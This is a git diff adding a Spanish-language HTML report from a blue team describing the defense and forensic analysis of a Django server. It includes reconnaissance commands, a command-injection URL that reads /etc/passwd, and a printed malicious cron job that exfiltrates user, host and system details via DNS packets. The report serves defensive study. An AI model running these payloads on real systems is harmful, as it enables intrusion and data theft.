@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Informe Defensa y Análisis Forense – Proyecto FIREWALL ZERO – Fase 4</title>
+    <style>
+        body {
+            background-color: #1e1e1e;
+            color: #e0e0e0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 40px;
+            line-height: 1.6;
+        }
+
+        h1,
+        h2,
+        h3 {
+            color: #00bfff;
+        }
+
+        h1 {
+            font-size: 2.2rem;
+            border-bottom: 2px solid #00bfff;
+            padding-bottom: 0.5rem;
+        }
+
+        h2 {
+            margin-top: 2rem;
+        }
+
+        pre {
+            background-color: #2a2a2a;
+            padding: 10px;
+            border-left: 4px solid #00bfff;
+            overflow-x: auto;
+        }
+
+        code {
+            color: #00ff99;
+        }
+
+        .info-box {
+            background-color: #292929;
+            border: 1px solid #444;
+            padding: 15px;
+            margin: 15px 0;
+            border-left: 5px solid #00bfff;
+        }
+
+        .highlight {
+            color: #ffd700;
+        }
+         .enlace a {
+      display: inline-block;
+      margin: 15px;
+      padding: 12px 24px;
+      background-color: #00ffff;
+      color: #000;
+      text-decoration: none;
+      border-radius: 8px;
+      font-weight: bold;
+      transition: background-color 0.3s;
+    }
+
+    a:hover {
+      background-color: #00cccc;
+    }
+
+        .footer {
+            margin-top: 40px;
+            border-top: 1px solid #444;
+            font-size: 0.9em;
+            padding-top: 10px;
+            color: #888;
+        }
+    </style>
+</head>
+
+<body>
+
+    <h1>Proyecto FIREWALL ZERO – Fase 4</h1>
+    <p><strong>Informe Defensa, Cierre y Análisis Forense</strong></p>
+
+    <div class="info-box">
+        <strong>Equipo Blue-Team:</strong><br>
+        FREDDY ALEXIS VEGAS GIL<br>
+        NATALIA KUCHERENKO SHEVEROVA<br>
+        CARLOS LOPEZ VILLA<br><br>
+        <strong>Fecha de entrega:</strong> 09-07-2025<br>
+        <strong>Empresa:</strong> Socistar Caribe S.L.
+    </div>
+
+    <h2>🎯 Objetivos del Equipo Defensor</h2>
+    <ul>
+        <li>Proteger el servidor en: <code>http://217.160.2.198:8443</code></li>
+        <li>Detectar y registrar intentos de ataque.</li>
+        <li>Responder sin interrumpir el servicio.</li>
+        <li>Documentar y evaluar la eficacia de las defensas.</li>
+    </ul>
+
+    <h2>🔍 Revisión y Detección</h2>
+    <p>Herramientas utilizadas:</p>
+    <pre>
+nmap -sV -Pn 217.160.2.198
+whatweb -v -a3 217.160.2.198:8443
+gobuster dir -u http://217.160.2.198:8443/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
+  </pre>
+
+    <p>Se identificaron directorios potencialmente vulnerables: <code>/accounts/login</code>,
+        <code>/accounts/registro</code>.</p>
+
+    <h2>🧨 Explotación Detectada</h2>
+    <ul>
+        <li>SQL Injection en <code>/accounts/registro</code></li>
+        <li>Command Injection en <code>/accounts/command_injection/?cmd=</code></li>
+    </ul>
+
+    <pre>
+Ejemplo de explotación:
+http://217.160.2.198:8443/accounts/command_injection/?cmd=cat%20/etc/passwd
+  </pre>
+
+    <h2>🛡️ Medidas Defensivas Aplicadas</h2>
+    <p>Activación y configuración de <code>fail2ban</code> y <code>ufw</code>. Monitorización con:</p>
+    <pre>
+sudo tcpdump -i any port 8443 -n
+sudo logwatch --detail high --service all --range today --format text
+  </pre>
+
+    <h2>📛 Bloqueo de IPs Atacantes</h2>
+    <pre>
+IPs maliciosas detectadas:
+103.100.208.68 – Hong Kong
+86.54.25.130 – Kazakhstan
+92.118.39.34 – Romania
+...
+  </pre>
+
+    <p>Automatización de bloqueo mediante script diario en <code>cron</code>.</p>
+
+    <h2>🔍 Análisis Forense</h2>
+    <ul>
+        <li>Revisión de logs: <code>auth.log, syslog, journalctl</code></li>
+        <li>Verificación de integridad con <code>chkrootkit</code> y <code>sha256sum</code></li>
+        <li>Identificación de conexiones sospechosas y procesos persistentes</li>
+    </ul>
+
+    <section id="analisis-forense">
+
+
+        <h3>⏰ Tareas programadas sospechosas (Cron Jobs)</h3>
+        <p>Se detectaron dos tareas en <strong>crontab</strong> ejecutando código Python cada minuto que envía
+            información del sistema mediante paquetes DNS:</p>
+        <pre><code>* * * * * python3 -c 'import os,socket;from platform import platform;from scapy.all import *;u=os.popen("whoami").read().strip();h=socket.gethostname();i=socket.gethostbyname(h);s=platform().replace(" ","-");d=f"{u}-{h}-{i}-{s}.lab";p=IP(dst="192.168.0.28")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=d));send(p)'</code></pre>
+        <p>⚠️ Esta actividad es altamente sospechosa y podría estar filtrando información del sistema a una dirección
+            externa (192.168.0.28). Requiere análisis inmediato y eliminación.</p>
+
+        <h3>🚪 Posibles puertas traseras</h3>
+        <p>Se identificaron múltiples usuarios del sistema con UID &lt; 1000. Aunque muchos son servicios comunes, se
+            encontró un proceso activo con nombre inusual:</p>
+        <ul>
+            <li><strong>Proceso sospechoso:</strong> <code>adminsu+</code> ejecutando bash (PID 1512190)</li>
+        </ul>
+        <p>⚠️ Este proceso no es típico de una cuenta legítima y debe ser investigado. Podría estar relacionado con
+            acceso persistente no autorizado.</p>
+
+        <h3>🔒 Conexiones SSH activas</h3>
+        <p>Se detectaron conexiones activas desde:</p>
+        <ul>
+            <li>Barcelona, ES – IP: <code>37.223.29.180</code></li>
+            <li>Valencia, ES – IP: <code>37.14.46.1</code></li>
+        </ul>
+        <p>Revisar si dichas IPs corresponden a usuarios legítimos.</p>
+
+        <h3>⚠️ Intentos fallidos de conexión por SSH (fuerza bruta)</h3>
+        <p>Se identificaron múltiples intentos de fuerza bruta desde ubicaciones globales. Principales IPs atacantes:
+        </p>
+        <ol>
+            <li>196.251.71.211 – Amsterdam, NL (1115 intentos)</li>
+            <li>80.94.95.15 – Timişoara, RO (316 intentos)</li>
+            <li>45.146.130.113 – Kerkrade, NL (245 intentos)</li>
+            <li>86.54.25.130 – Helsinki, FI (214 intentos)</li>
+            <!-- puedes continuar con el resto si deseas incluir las 20 IPs -->
+        </ol>
+        <p>🔐 Se recomienda bloquear estas IPs utilizando UFW o iptables, y configurar Fail2Ban adecuadamente para
+            mitigar este tipo de ataques.</p>
+
+        <h3>📦 Estado de actualizaciones de seguridad</h3>
+        <p>Se encontraron <strong>10 paquetes clave</strong> con actualizaciones pendientes. Algunos pueden estar
+            relacionados con componentes críticos como DNS, fwupd y BlueZ.</p>
+
+        <h3>🦠 Escaneo de virus (ClamAV)</h3>
+        <p>✅ No se detectaron virus en el sistema.</p>
+
+        <h3>📌 Recomendaciones inmediatas</h3>
+        <ul>
+            <li>Eliminar o investigar el cron job sospechoso en todos los crontabs de usuarios.</li>
+            <li>Eliminar o deshabilitar el proceso <code>adminsu+</code> y revisar la cuenta asociada.</li>
+            <li>Actualizar el sistema: <code>sudo apt update && sudo apt upgrade</code></li>
+            <li>Revisar y endurecer reglas de firewall UFW / iptables.</li>
+            <li>Bloquear IPs maliciosas detectadas y configurar correctamente Fail2Ban.</li>
+            <li>Realizar auditorías periódicas con Lynis y monitorear nuevos usuarios o procesos.</li>
+        </ul>
+
+        <p>🧩 Más información:</p>
+        <ul>
+            <li><a href="https://cisofy.com/documentation/lynis/" target="_blank">Documentación Lynis</a></li>
+            <li><a href="https://www.fail2ban.org/" target="_blank">Sitio oficial de Fail2Ban</a></li>
+        </ul>
+    </section>
+
+
+
+
+
+    <div class="info-box">
+        🔹 <span class="highlight">IP sospechosa:</span> 37.14.46.1<br>
+        🔹 ISP: Orange España (Madrid)<br>
+        🔹 Actividad detectada: <em>Intentos de acceso por fuerza bruta SSH</em><br>
+        🔹 Reporte enviado a: <code>abuse.es@orange.com</code><br>
+        🔹 Evidencias adjuntas: logs y trazas IP
+    </div>
+
+    <h2>🔐 Recomendaciones Finales</h2>
+    <ul>
+        <li>Desactivar <code>DEBUG</code> en Django</li>
+        <li>Establecer <code>ALLOWED_HOSTS</code> y <code>SECURE_SSL_REDIRECT</code></li>
+        <li>Uso de headers de seguridad y cookies seguras</li>
+        <li>Auditoría de código con <code>bandit</code> y <code>safety</code></li>
+        <li>Pruebas activas con OWASP ZAP / Burp Suite</li>
+        <li>Backups cifrados y automatizados</li>
+    </ul>
+    <div class="enlace">
+    <a href="https://docs.google.com/document/d/1JtLHSI5nA19ZxXXxrhpMOeVOS1IkT7bawE_HuRQE7gA/edit?tab=t.0"
+      target="_blank">Informe Técnico</pre>
+    <a href="https://firewall-zero.github.io/Dashboard_T-cnico_Proceso_de_selecci-n_t-cnica_Departamento_de_Ciberseguridad/"
+        target="_blank">Dashboard Técnico</pre>
+  </div>
+
+    <div class="footer">
+        Informe generado por el equipo Blue-Team – Proyecto FIREWALL ZERO – 2025<br>
+        © Socistar Caribe S.L.
+    </div>
+
+</body>
+
+</html>
